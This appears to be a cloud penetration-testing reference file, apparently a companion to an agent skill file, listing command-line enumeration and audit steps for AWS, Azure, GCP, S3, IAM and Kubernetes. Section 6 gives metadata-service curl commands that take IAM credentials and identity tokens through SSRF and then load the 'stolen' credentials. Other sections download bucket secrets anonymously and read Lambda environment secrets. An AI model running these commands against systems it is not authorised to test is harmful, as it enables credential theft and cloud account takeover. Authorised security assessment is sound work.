# Cloud Security -- Attack Payloads

> This file is a companion to `SKILL.md`, containing cloud security attack payloads organized by category.

---

## 1. AWS Security Testing (awscli / ScoutSuite / Prowler)

### AWS CLI Basic Enumeration

```bash
# Confirm current identity and account
aws sts get-caller-identity

# List all regions
aws ec2 describe-regions --query 'Regions[*].RegionName' --output text

# Enumerate EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,SecurityGroups[*].GroupId]' --output table

# Enumerate RDS instances
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# Enumerate Lambda functions
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
```

### ScoutSuite Multi-Cloud Audit

```bash
# AWS security audit
scout aws --profile default --report-dir ./report

# View the generated report in a browser
# Focus areas: IAM > Bucket policies > Security groups > Encryption configuration > Logging status
```

### Prowler Compliance Scanning

```bash
# Install Prowler
pip install prowler

# Run AWS security assessment
prowler aws -p default

# Check specific categories only
prowler aws -p default --checks iam,ec2,s3

# Output JSON format
prowler aws -p default -o json > prowler-results.json
```

---

## 2. Azure Security Testing

### Azure CLI Enumeration

```bash
# Login and get subscription information
az login
az account list --output table
az account set --subscription "TARGET_SUB_ID"

# Enumerate resource groups
az group list --output table

# Enumerate virtual machines
az vm list --show-details --query '[].[name,location,publicIps]' --output table

# Enumerate storage accounts
az storage account list --query '[].[name,location,enableHttpsTrafficOnly]' --output table

# Enumerate Key Vaults
az keyvault list --query '[].[name,location,enabledForDeployment]' --output table
```

### ScoutSuite Azure Audit

```bash
# Azure security audit
scout azure --cli

# Focus areas: RBAC assignments > Storage account encryption > NSG rules > Key Vault access policies
```

---

## 3. GCP Security Testing

### gcloud CLI Enumeration

```bash
# Authentication and project enumeration
gcloud auth login
gcloud projects list --format="table(projectId,name,lifecycleState)"
gcloud config set project TARGET_PROJECT_ID

# Enumerate Compute Engine instances
gcloud compute instances list --format="table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP)"

# Enumerate Cloud Storage buckets
gcloud storage ls --project TARGET_PROJECT_ID

# Enumerate Cloud Functions
gcloud functions list --format="table(name,region,runtime)"

# Enumerate IAM policies
gcloud projects get-iam-policy TARGET_PROJECT_ID --format=json
```

### ScoutSuite GCP Audit

```bash
# GCP security audit
scout gcp --project-id my-project
```

---

## 4. S3 Bucket Enumeration and Misconfiguration Detection

### awscli -- Bucket ACL and Policy

```bash
# List all buckets
aws s3api list-buckets --query 'Buckets[*].Name'

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket

# Check encryption configuration
aws s3api get-bucket-encryption --bucket target-bucket

# Check versioning status
aws s3api get-bucket-versioning --bucket target-bucket

# Check logging configuration
aws s3api get-bucket-logging --bucket target-bucket
```

### Anonymous Access Testing

```bash
# List public bucket contents without authentication
aws s3 ls s3://target-bucket --no-sign-request

# Download sensitive files without authentication
aws s3 cp s3://target-bucket/secrets.txt . --no-sign-request

# Anonymous upload test (verify write permissions)
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### s3scanner Batch Scanning

```bash
# Scan a single bucket
s3scanner scan --bucket company-backup

# Batch scan bucket list
s3scanner scan --bucket-list buckets.txt --output results.json
```

---

## 5. IAM Policy Analysis

### pacu -- AWS Penetration Testing Framework

```bash
# Install and start pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu
pip install -r requirements.txt
python3 pacu.py

# pacu interactive operations
set_keys                              # Configure AWS credentials
run iam__enum_users                   # Enumerate IAM users
run iam__enum_roles                   # Enumerate IAM roles
run iam__enum_policies                # Enumerate policies
run iam__privesc_scan                 # Scan privilege escalation paths
run ec2__enum                         # Enumerate EC2 instances
```

### awscli -- Manual IAM Enumeration

```bash
# List users
aws iam list-users --output table

# List roles
aws iam list-roles --query 'Roles[*].RoleName'

# Get policy details
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1

# List policies attached to user
aws iam list-attached-user-policies --user-name target-user

# List role trust policy
aws iam get-role --role-name target-role --query 'Role.AssumeRolePolicyDocument'

# List access keys
aws iam list-access-keys --user-name target-user

# Check MFA status
aws iam list-mfa-devices --user-name target-user
```

---

## 6. Cloud Metadata Exploitation (SSRF to Cloud)

### AWS IMDSv1 / IMDSv2

```bash
# IMDSv1 -- Obtain IAM temporary credentials via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv1 -- Get instance metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/user-data

# IMDSv2 -- Requires PUT request to obtain token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Configure AWS CLI with stolen temporary credentials
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrXU...
aws configure set aws_session_token FwoGZXI...
```

### Azure IMDS

```bash
# Azure instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Azure get managed identity token
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Metadata

```bash
# GCP instance metadata
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/"

# GCP get service account token
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

---

## 7. Serverless Security Testing

### Lambda Function Enumeration and Security Assessment

```bash
# Enumerate Lambda functions and environment variables (may contain secrets)
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
aws lambda get-function-configuration --function-name target-function --query 'Environment.Variables'

# Enumerate Lambda layers (may contain shared secrets)
aws lambda list-layers --query 'Layers[*].[LayerName,LatestMatchingVersion.Version]'

# Get function code download link
aws lambda get-function --function-name target-function --query 'Code.Location'

# Check function concurrency configuration
aws lambda get-function-concurrency --function-name target-function
```

---

## 8. Kubernetes / Docker Cloud Exploitation

### trivy -- Container and IaC Scanning

```bash
# Scan container image vulnerabilities
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# Scan IaC configuration files (Terraform/CloudFormation)
trivy config ./terraform/
trivy config ./cloudformation/

# Scan Kubernetes cluster
trivy k8s --report summary cluster

# File system scan
trivy fs --severity HIGH,CRITICAL /path/to/project
```

### kubeaudit -- Kubernetes Security Audit

```bash
# Automated security audit
kubeaudit all -n kube-system

# Detect and suggest fixes
kubeaudit autofix -f deployment.yaml
```

### kubectl -- Manual RBAC Audit

```bash
# List all roles and cluster roles
kubectl get roles --all-namespaces
kubectl get clusterroles -o json | jq '.items[].rules'

# Check specific ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:sac

# Check dangerous RBAC rules -- anonymous user binding
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name=="system:anonymous")'

# Check Pod security contexts
kubectl get pods -o json | jq '.items[].spec.securityContext'

# Detect privileged containers
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext.privileged'

# Check hostPath mounts
kubectl get pods -o json | jq '.items[].spec.volumes[] | select(.hostPath)'
```
